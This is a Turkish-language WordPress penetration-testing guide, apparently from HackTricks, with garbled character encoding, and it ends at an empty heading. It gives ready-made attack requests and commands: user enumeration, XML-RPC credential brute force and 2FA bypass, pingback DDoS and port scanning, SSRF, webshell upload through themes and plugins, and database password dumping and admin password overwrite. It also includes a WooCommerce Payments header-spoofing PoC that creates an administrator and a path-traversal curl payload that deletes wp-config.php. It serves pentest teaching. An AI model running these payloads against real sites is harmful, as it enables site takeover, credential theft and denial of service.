# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

- **Uploaded** dosyalarÄ± gider: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** bu nedenle tema php'sini deÄŸiÅŸtirip RCE elde etmeye Ã§alÄ±ÅŸÄ±rsanÄ±z muhtemelen bu yolu kullanÄ±rsÄ±nÄ±z. Ã–rneÄŸin: **theme twentytwelve** kullanarak ÅŸu dosyaya **eriÅŸebilirsiniz**: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- `wp-config.php` iÃ§inde veritabanÄ± root parolasÄ±nÄ± bulabilirsiniz.
- Kontrol edilmesi gereken varsayÄ±lan giriÅŸ yollarÄ±: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` yÃ¼klÃ¼ WordPress sÃ¼rÃ¼mÃ¼ gibi faydalÄ± bilgiler iÃ§erir.
- `wp-activate.php` yeni bir WordPress sitesi kurulduÄŸunda e-posta aktivasyon sÃ¼reci iÃ§in kullanÄ±lÄ±r.
- GiriÅŸ klasÃ¶rleri (gizlemek iÃ§in yeniden adlandÄ±rÄ±lmÄ±ÅŸ olabilir):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` WordPress'in HTTP taÅŸÄ±yÄ±cÄ± mekanizma ve XML kodlama mekanizmasÄ±yla veri iletimine izin veren bir Ã¶zelliÄŸini temsil eden bir dosyadÄ±r. Bu tÃ¼r iletiÅŸim WordPress [REST API](https://developer.wordpress.org/rest-api/reference) ile deÄŸiÅŸtirilmiÅŸtir.
- `wp-content` klasÃ¶rÃ¼ eklentilerin ve temalarÄ±n saklandÄ±ÄŸÄ± ana dizindir.
- `wp-content/uploads/` platforma yÃ¼klenen herhangi bir dosyanÄ±n saklandÄ±ÄŸÄ± dizindir.
- `wp-includes/` sertifikalar, fontlar, JavaScript dosyalarÄ± ve widget'lar gibi Ã§ekirdek dosyalarÄ±n bulunduÄŸu dizindir.
- `wp-sitemap.xml` WordPress 5.5 ve Ã¼zeri sÃ¼rÃ¼mlerde, WordPress tÃ¼m herkese aÃ§Ä±k gÃ¶nderiler ve herkese aÃ§Ä±k sorgulanabilir gÃ¶nderi tÃ¼rleri ile taksonomiler iÃ§in bir sitemap XML dosyasÄ± oluÅŸturur.

**Post exploitation**

- `wp-config.php` dosyasÄ± WordPress'in veritabanÄ±na baÄŸlanmak iÃ§in gereken veritabanÄ± adÄ±, veritabanÄ± hostu, kullanÄ±cÄ± adÄ± ve parola, authentication keys ve salts ile veritabanÄ± tablo Ã¶nekinin (prefix) bilgilerini iÃ§erir. Bu yapÄ±landÄ±rma dosyasÄ± ayrÄ±ca DEBUG modunu aktifleÅŸtirmek iÃ§in de kullanÄ±labilir; bu da sorun giderme sÄ±rasÄ±nda yararlÄ± olabilir.

### KullanÄ±cÄ± Ä°zinleri

- **Administrator**
- **Editor**: Kendi ve diÄŸerlerinin gÃ¶nderilerini yayÄ±nlar ve yÃ¶netir
- **Author**: Kendi gÃ¶nderilerini yayÄ±nlar ve yÃ¶netir
- **Contributor**: GÃ¶nderilerini yazar ve yÃ¶netir fakat yayÄ±nlayamaz
- **Subscriber**: GÃ¶nderileri gÃ¶rÃ¼ntÃ¼ler ve profillerini dÃ¼zenler

## **Passive Enumeration**

### **Get WordPress version**

`/license.txt` veya `/readme.html` dosyalarÄ±nÄ± bulup bulamayacaÄŸÄ±nÄ±zÄ± kontrol edin

SayfanÄ±n **source code** iÃ§inde (Ã¶rnek: [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS link dosyalarÄ±

![](<../../images/image (533).png>)

- JavaScript dosyalarÄ±

![](<../../images/image (524).png>)

### Eklentileri Al
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### TemalarÄ± Al
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Genel olarak sÃ¼rÃ¼mleri Ã§Ä±karma
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktif keÅŸif

### Eklentiler ve Temalar

Muhtemelen tÃ¼m eklenti ve temalarÄ± bulamayacaksÄ±nÄ±z. BunlarÄ±n hepsini keÅŸfetmek iÃ§in bir eklenti ve tema listesine **aktif olarak Brute Force** yapmanÄ±z gerekecek (umarÄ±z ki bizim iÃ§in bu listeleri iÃ§eren otomatik araÃ§lar vardÄ±r).

### KullanÄ±cÄ±lar

- **ID Brute:** Bir WordPress sitesinden kullanÄ±cÄ± ID'lerini Brute Forcing yaparak geÃ§erli kullanÄ±cÄ±lar elde edersiniz:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
EÄŸer yanÄ±tlar **200** veya **30X** ise, bu id'nin **geÃ§erli** olduÄŸu anlamÄ±na gelir. EÄŸer yanÄ±t **400** ise, id **geÃ§ersiz**dir.

- **wp-json:** KullanÄ±cÄ±lar hakkÄ±nda bilgi almak iÃ§in sorgulamayÄ± da deneyebilirsiniz:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
KullanÄ±cÄ±lar hakkÄ±nda bazÄ± bilgiler ortaya Ã§Ä±karabilecek bir diÄŸer `/wp-json/` endpoint'i ÅŸudur:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **Sadece bu Ã¶zelliÄŸi etkinleÅŸtirmiÅŸ kullanÄ±cÄ±lar hakkÄ±nda bilgi saÄŸlanacaktÄ±r**.

AyrÄ±ca **/wp-json/wp/v2/pages** IP adreslerini leak edebilir.

- **Login username enumeration**: **`/wp-login.php`**'de giriÅŸ yaparken gÃ¶sterilen **mesaj**, belirtilen **kullanÄ±cÄ± adÄ±nÄ±n var olup olmadÄ±ÄŸÄ±na gÃ¶re farklÄ±dÄ±r**.

### XML-RPC

EÄŸer `xml-rpc.php` aktifse credentials brute-force gerÃ§ekleÅŸtirebilir veya bunu diÄŸer kaynaklara DoS attacks baÅŸlatmak iÃ§in kullanabilirsiniz. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

Aktif olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in _**/xmlrpc.php**_ adresine eriÅŸmeyi deneyin ve ÅŸu isteÄŸi gÃ¶nderin:

**Kontrol**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** veya **`metaWeblog.getUsersBlogs`** credentials Ã¼zerinde brute-force yapmak iÃ§in kullanÄ±labilecek bazÄ± yÃ¶ntemlerdir. EÄŸer bunlardan herhangi birini bulabilirseniz ÅŸu ÅŸekilde bir ÅŸey gÃ¶nderebilirsiniz:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Kimlik bilgileri geÃ§erli deÄŸilse, 200 kodlu bir yanÄ±tta _"Incorrect username or password"_ mesajÄ± gÃ¶rÃ¼nmelidir.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

DoÄŸru kimlik bilgilerini kullanarak bir dosya yÃ¼kleyebilirsiniz. YanÄ±tta yol ÅŸu ÅŸekilde gÃ¶rÃ¼nÃ¼r ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
AyrÄ±ca aynÄ± istekte birden fazla kimlik bilgisi deneyebildiÄŸiniz iÃ§in **`system.multicall`** kullanarak kimlik bilgilerini brute-force etmek iÃ§in **daha hÄ±zlÄ± bir yol** vardÄ±r:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Bu yÃ¶ntem programlar iÃ§in tasarlanmÄ±ÅŸtÄ±r, insanlar iÃ§in deÄŸil ve eski olduÄŸu iÃ§in 2FA'yÄ± desteklemez. Yani, geÃ§erli kimlik bilgilerine sahipseniz ancak ana giriÅŸ 2FA ile korunuyorsa, **xmlrpc.php'yi kÃ¶tÃ¼ye kullanarak o kimlik bilgileriyle 2FA'yÄ± atlayÄ±p giriÅŸ yapabilmeniz mÃ¼mkÃ¼n olabilir**. Konsoldan yapabildiÄŸiniz tÃ¼m iÅŸlemleri gerÃ§ekleÅŸtiremeyebileceÄŸinizi unutmayÄ±n, ancak Ippsec'in aÃ§Ä±kladÄ±ÄŸÄ± gibi yine de RCE'ye ulaÅŸabilmeniz mÃ¼mkÃ¼n olabilir [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

EÄŸer listede _**pingback.ping**_ yÃ¶ntemini bulabilirseniz Wordpress'in herhangi bir host/port'a rastgele bir istek gÃ¶ndermesini saÄŸlayabilirsiniz.\
Bu, binlerce Wordpress **site**nin tek bir **konuma** **eriÅŸmesini** istemek iÃ§in kullanÄ±labilir (bÃ¶ylece o konumda bir **DDoS** oluÅŸur) veya bunu **Wordpress**'in bazÄ± iÃ§ **aÄŸlarÄ±** **taramasÄ±** iÃ§in kullanabilirsiniz (herhangi bir port belirtebilirsiniz).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

EÄŸer **faultCode** deÄŸeri **0'dan bÃ¼yÃ¼k** (17) ise, bu portun aÃ§Ä±k olduÄŸunu gÃ¶sterir.

Ã–nceki bÃ¶lÃ¼mdeki **`system.multicall`** kullanÄ±mÄ±na bakÄ±n; bu yÃ¶ntemi kÃ¶tÃ¼ye kullanarak nasÄ±l DDoS oluÅŸturulacaÄŸÄ±nÄ± Ã¶ÄŸrenin.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Bu dosya genellikle Wordpress sitesinin kÃ¶k dizininde bulunur: **`/wp-cron.php`**\
Bu dosyaya **eriÅŸildiÄŸinde** bir "**aÄŸÄ±r**" MySQL **query** Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r; bu yÃ¼zden **attackers** bunu kullanarak bir **DoS**'a **sebep** olabilir.\
AyrÄ±ca, varsayÄ±lan olarak, `wp-cron.php` her sayfa yÃ¼kleniÅŸinde (bir istemci herhangi bir Wordpress sayfasÄ±nÄ± istediÄŸinde) Ã§aÄŸrÄ±lÄ±r; bu da yÃ¼ksek trafikli sitelerde sorunlara (DoS) yol aÃ§abilir.

Wp-Cron'u devre dÄ±ÅŸÄ± bÄ±rakÄ±p host iÃ§inde gerÃ§ek bir cronjob oluÅŸturarak gerekli iÅŸlemlerin dÃ¼zenli aralÄ±klarla (sorun Ã§Ä±karmadan) gerÃ§ekleÅŸtirilmesi Ã¶nerilir.

### /wp-json/oembed/1.0/proxy - SSRF

Åu adrese eriÅŸmeyi deneyin _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ ve Worpress site size bir istek yapabilir.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Bu araÃ§ **methodName: pingback.ping** olup olmadÄ±ÄŸÄ±nÄ± ve **/wp-json/oembed/1.0/proxy** yolunun varlÄ±ÄŸÄ±nÄ± kontrol eder; eÄŸer varsa bunlarÄ± exploit etmeye Ã§alÄ±ÅŸÄ±r.

## Otomatik AraÃ§lar
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Bir biti deÄŸiÅŸtirerek eriÅŸim

GerÃ§ek bir saldÄ±rÄ±dan ziyade bu bir merak. CTF'de [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) herhangi bir wordpress dosyasÄ±ndan 1 biti Ã§evirebiliyordunuz. BÃ¶ylece `/var/www/html/wp-includes/user.php` dosyasÄ±nÄ±n `5389` konumundaki biti Ã§evirerek NOT (`!`) iÅŸlemini NOP yapabilirdiniz.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**KullanÄ±lan temadan bir php deÄŸiÅŸtirme (admin credentials needed)**

GÃ¶rÃ¼nÃ¼m â†’ Tema DÃ¼zenleyici â†’ 404 Åablonu (saÄŸda)

php shell iÃ§in iÃ§eriÄŸi deÄŸiÅŸtirin:

![](<../../images/image (384).png>)

Internette gÃ¼ncellenmiÅŸ sayfaya nasÄ±l eriÅŸeceÄŸinizi arayÄ±n. Bu durumda buraya eriÅŸmelisiniz: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Åunu kullanabilirsiniz:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
oturum elde etmek iÃ§in.

## Eklenti RCE

### PHP eklentisi

.php dosyalarÄ±nÄ± eklenti olarak yÃ¼klemek mÃ¼mkÃ¼n olabilir.\
Ã–rneÄŸin PHP backdoor'unuzu ÅŸu ÅŸekilde oluÅŸturun:

![](<../../images/image (183).png>)

Sonra yeni bir eklenti ekleyin:

![](<../../images/image (722).png>)

Eklentiyi yÃ¼kleyip "Install Now" tuÅŸuna basÄ±n:

![](<../../images/image (249).png>)

Procced'e tÄ±klayÄ±n:

![](<../../images/image (70).png>)

Muhtemelen gÃ¶rÃ¼nÃ¼rde hiÃ§bir ÅŸey olmaz, ama Media'ya giderseniz yÃ¼klenmiÅŸ shell'inizi gÃ¶receksiniz:

![](<../../images/image (462).png>)

Onu aÃ§tÄ±ÄŸÄ±nÄ±zda reverse shell'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in URL'i gÃ¶receksiniz:

![](<../../images/image (1006).png>)

### KÃ¶tÃ¼ amaÃ§lÄ± eklentinin yÃ¼klenmesi ve etkinleÅŸtirilmesi

Bu yÃ¶ntem, bilinen bir zafiyete sahip ve web shell elde etmek iÃ§in istismar edilebilen kÃ¶tÃ¼ amaÃ§lÄ± bir eklentinin kurulmasÄ±nÄ± iÃ§erir. Bu sÃ¼reÃ§ WordPress dashboard'Ä± Ã¼zerinden ÅŸu ÅŸekilde gerÃ§ekleÅŸtirilir:

1. **Eklentinin Edinilmesi**: Eklenti, Exploit DB gibi bir kaynaktan edinilir; Ã¶rneÄŸin [**here**](https://www.exploit-db.com/exploits/36374).
2. **Eklenti Kurulumu**:
- WordPress dashboard'Ä±na gidin, ardÄ±ndan `Dashboard > Plugins > Upload Plugin` yolunu izleyin.
- Ä°ndirilen eklentinin zip dosyasÄ±nÄ± yÃ¼kleyin.
3. **Eklentinin EtkinleÅŸtirilmesi**: Eklenti baÅŸarÄ±yla kurulduktan sonra dashboard Ã¼zerinden etkinleÅŸtirilmelidir.
4. **Ä°stismar**:
- "reflex-gallery" eklentisi yÃ¼klÃ¼ ve etkinleÅŸtirilmiÅŸse, bilinen bir zafiyet nedeniyle istismar edilebilir.
- Metasploit framework bu zafiyet iÃ§in bir exploit saÄŸlar. Uygun modÃ¼lÃ¼ yÃ¼kleyip belirli komutlarÄ± Ã§alÄ±ÅŸtÄ±rarak, siteye yetkisiz eriÅŸim saÄŸlayan bir meterpreter oturumu kurulabilir.
- Bu, WordPress sitesini istismar etmenin birÃ§ok yÃ¶nteminden sadece biri olduÄŸuna dikkat edilmelidir.

Ä°Ã§erik, eklentinin kurulmasÄ± ve etkinleÅŸtirilmesine iliÅŸkin adÄ±mlarÄ± gÃ¶steren gÃ¶rsel yardÄ±mcÄ±lar iÃ§erir. Ancak, bu tÃ¼r zafiyetleri yetkisiz ÅŸekilde istismar etmenin yasa dÄ±ÅŸÄ± ve etik dÄ±ÅŸÄ± olduÄŸunu belirtmek Ã¶nemlidir. Bu bilgiler sorumlu ÅŸekilde ve yalnÄ±zca aÃ§Ä±k izinle yapÄ±lan penetration testing gibi yasal baÄŸlamlarda kullanÄ±lmalÄ±dÄ±r.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## XSS'den RCE'ye

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). It provides **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Yetki YÃ¼kseltme:**_ WordPress'te bir kullanÄ±cÄ± oluÅŸturur.
- _**(RCE) Ã–zel Eklenti (backdoor) YÃ¼kleme:**_ Ã–zel eklentinizi (backdoor) WordPress'e yÃ¼kleyin.
- _**(RCE) Dahili Eklenti DÃ¼zenleme:**_ WordPress'teki dahili eklentileri dÃ¼zenleyin.
- _**(RCE) Dahili Tema DÃ¼zenleme:**_ WordPress'teki dahili temalarÄ± dÃ¼zenleyin.
- _**(Ã–zel) Ã–zel Exploitler:**_ ÃœÃ§Ã¼ncÃ¼ taraf WordPress eklentileri/temalarÄ± iÃ§in Ã¶zel Exploitler.

## Ä°stismar SonrasÄ±

KullanÄ±cÄ± adlarÄ± ve ÅŸifreleri Ã§Ä±karÄ±n:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Admin parolasÄ±nÄ± deÄŸiÅŸtir:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### SaldÄ±rÄ± YÃ¼zeyi

Bir Wordpress eklentisinin hangi yollarla iÅŸlevsellik aÃ§Ä±ÄŸa Ã§Ä±karabileceÄŸini bilmek, o iÅŸlevsellikteki zafiyetleri bulmak iÃ§in kritiktir. Bir eklentinin iÅŸlevselliÄŸi nasÄ±l aÃ§Ä±ÄŸa Ã§Ä±karabileceÄŸini aÅŸaÄŸÄ±daki maddelerde bulabilirsiniz ve Ã¶rnek zafiyetli eklentilere dair bazÄ± Ã¶rnekler [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/)'ta mevcuttur.

- **`wp_ajax`**

Bir eklentinin iÅŸlevleri kullanÄ±cÄ±lara aÃ§Ä±ÄŸa Ã§Ä±karmasÄ±nÄ±n yollarÄ±ndan biri AJAX handler'larÄ± aracÄ±lÄ±ÄŸÄ±yladÄ±r. Bu handler'lar mantÄ±k, yetkilendirme veya kimlik doÄŸrulama hatalarÄ± iÃ§erebilir. AyrÄ±ca, bu fonksiyonlarÄ±n hem kimlik doÄŸrulama hem de yetkilendirmeyi genellikle bir wordpress nonce'unun varlÄ±ÄŸÄ±na dayandÄ±rmasÄ± sÄ±k rastlanan bir durumdur; bu nonce'a **wordpress Ã¶rneÄŸinde kimliÄŸi doÄŸrulanmÄ±ÅŸ herhangi bir kullanÄ±cÄ± sahip olabilir** (rolÃ¼nden baÄŸÄ±msÄ±z olarak).

Bunlar, bir eklentide bir fonksiyonu aÃ§Ä±ÄŸa Ã§Ä±karmak iÃ§in kullanÄ±labilecek fonksiyonlardÄ±r:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` kullanÄ±mÄ± endpoint'i herhangi bir kullanÄ±cÄ± tarafÄ±ndan (kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ olanlar dahil) eriÅŸilebilir kÄ±lar.**

> [!CAUTION]
> AyrÄ±ca, eÄŸer fonksiyon sadece kullanÄ±cÄ±nÄ±n yetkilendirmesini `wp_verify_nonce` fonksiyonu ile kontrol ediyorsa, bu fonksiyon genellikle yalnÄ±zca kullanÄ±cÄ±nÄ±n giriÅŸ yapÄ±p yapmadÄ±ÄŸÄ±nÄ± kontrol eder; kullanÄ±cÄ±nÄ±n rolÃ¼nÃ¼ genellikle kontrol etmez. Bu yÃ¼zden dÃ¼ÅŸÃ¼k ayrÄ±calÄ±klÄ± kullanÄ±cÄ±lar yÃ¼ksek ayrÄ±calÄ±klÄ± iÅŸlemlere eriÅŸebilir.

- **REST API**

AyrÄ±ca `register_rest_route` fonksiyonunu kullanarak wordpress'ten fonksiyonlarÄ± REST API Ã¼zerinden eriÅŸime aÃ§mak da mÃ¼mkÃ¼ndÃ¼r:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` bir API yÃ¶ntemini Ã§aÄŸÄ±rmaya yetkili olup olmadÄ±ÄŸÄ±nÄ± kontrol eden bir geriÃ§aÄŸÄ±rÄ±m (callback) fonksiyonudur.

**EÄŸer yerleÅŸik `__return_true` fonksiyonu kullanÄ±lmÄ±ÅŸsa, kullanÄ±cÄ± izinleri kontrolÃ¼nÃ¼ atlar.**

- **php dosyasÄ±na doÄŸrudan eriÅŸim**

Elbette, Wordpress PHP kullanÄ±r ve eklenti iÃ§indeki dosyalar web'den doÄŸrudan eriÅŸilebilir. Bu yÃ¼zden bir eklenti, dosyaya sadece eriÅŸilmesiyle tetiklenen herhangi bir zayÄ±f iÅŸlevsellik aÃ§Ä±ÄŸa Ã§Ä±karÄ±yorsa, bu her kullanÄ±cÄ± tarafÄ±ndan istismar edilebilir.

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

BazÄ± eklentiler, dahili entegrasyonlar veya reverse proxies iÃ§in â€œtrusted headerâ€ kÄ±sa yollarÄ± uygular ve daha sonra REST istekleri iÃ§in mevcut kullanÄ±cÄ± baÄŸlamÄ±nÄ± ayarlamak Ã¼zere bu header'Ä± kullanÄ±r. EÄŸer header, upstream bir bileÅŸen tarafÄ±ndan kriptografik olarak isteÄŸe baÄŸlanmamÄ±ÅŸsa, bir saldÄ±rgan bu header'Ä± sahteleyebilir ve yÃ¶netici olarak ayrÄ±calÄ±klÄ± REST rotalarÄ±na eriÅŸebilir.

- Etki: kimlik doÄŸrulamasÄ± olmayan bir saldÄ±rganÄ±n core users REST rotasÄ± Ã¼zerinden yeni bir yÃ¶netici oluÅŸturarak admin ayrÄ±calÄ±klarÄ±na yÃ¼kselmesi.
- Ã–rnek header: `X-Wcpay-Platform-Checkout-User: 1` (kullanÄ±cÄ± ID'sini 1 olarak zorlar, genellikle ilk yÃ¶netici hesabÄ±).
- Ä°stismar edilen rota: `POST /wp-json/wp/v2/users` yÃ¼kseltilmiÅŸ bir rol iÃ§eren bir array ile.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Neden iÅŸe yarÄ±yor

- Eklenti, istemci tarafÄ±ndan kontrol edilen bir HTTP header'Ä±nÄ± kimlik doÄŸrulama durumuna eÅŸliyor ve capability kontrollerini atlÄ±yor.
- WordPress core bu route iÃ§in `create_users` capability'sini bekler; eklenti hack'i bunu header'dan doÄŸrudan mevcut kullanÄ±cÄ± baÄŸlamÄ±nÄ± ayarlayarak atlÄ±yor.

Beklenen baÅŸarÄ± gÃ¶stergeleri

- HTTP 201 ile oluÅŸturulan kullanÄ±cÄ±yÄ± tanÄ±mlayan bir JSON gÃ¶vdesi.
- `wp-admin/users.php` iÃ§inde gÃ¶rÃ¼nen yeni bir admin kullanÄ±cÄ±.

Tespit kontrol listesi

- Grep for `getallheaders()`, `$_SERVER['HTTP_...']`, or vendor SDKs that read custom headers to set user context (e.g., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Review REST registrations for privileged callbacks that lack robust `permission_callback` checks and instead rely on request headers.
- Look for usages of core user-management functions (`wp_insert_user`, `wp_create_user`) inside REST handlers that are gated only by header values.

### wp_ajax_nopriv aracÄ±lÄ±ÄŸÄ±yla KimliÄŸi DoÄŸrulanmamÄ±ÅŸ Keyfi Dosya Silme (Litho Theme <= 3.0)

WordPress temalarÄ± ve eklentileri sÄ±klÄ±kla `wp_ajax_` ve `wp_ajax_nopriv_` hook'larÄ± aracÄ±lÄ±ÄŸÄ±yla AJAX handler'larÄ± aÃ§Ä±ÄŸa Ã§Ä±karÄ±r. **_nopriv_** varyantÄ± kullanÄ±ldÄ±ÄŸÄ±nda **callback, kimliÄŸi doÄŸrulanmamÄ±ÅŸ ziyaretÃ§iler tarafÄ±ndan eriÅŸilebilir hale gelir**, bu nedenle herhangi bir hassas iÅŸlem ayrÄ±ca ÅŸu kontrolleri uygulamalÄ±dÄ±r:

1. Bir **capability kontrolÃ¼** (Ã¶r. `current_user_can()` veya en azÄ±ndan `is_user_logged_in()`), ve
2. `check_ajax_referer()` / `wp_verify_nonce()` ile doÄŸrulanan bir **CSRF nonce**, ve
3. **SÄ±kÄ± input sanitizasyonu / doÄŸrulama**.

Litho multipurpose tema (< 3.1), *Remove Font Family* Ã¶zelliÄŸinde bu 3 kontrolÃ¼ unutmuÅŸ ve sonuÃ§ olarak aÅŸaÄŸÄ±daki (basitleÅŸtirilmiÅŸ) kodu gÃ¶ndermiÅŸtir:
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Issues introduced by this snippet:

* **Kimlik doÄŸrulanmamÄ±ÅŸ eriÅŸim** â€“ the `wp_ajax_nopriv_` hook is registered.
* **Nonce / capability check yok** â€“ herhangi bir ziyaretÃ§i endpoint'e eriÅŸebilir.
* **Yol sanitisationu yok** â€“ kullanÄ±cÄ± kontrollÃ¼ `fontfamily` stringi filtrelenmeden bir dosya sistemi yoluna birleÅŸtiriliyor, klasik `../../` traversal'a izin veriyor.

#### Ä°stismar

Bir saldÄ±rgan tek bir HTTP POST isteÄŸi gÃ¶ndererek **yÃ¼klemeler temel dizininin altÄ±ndaki** (genellikle `<wp-root>/wp-content/uploads/`) herhangi bir dosyayÄ± veya dizini silebilir:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

DiÄŸer etkili hedefler arasÄ±nda plugin/theme `.php` dosyalarÄ± (gÃ¼venlik plugin'lerini bozmak iÃ§in) veya `.htaccess` kurallarÄ± bulunur.

#### Detection checklist

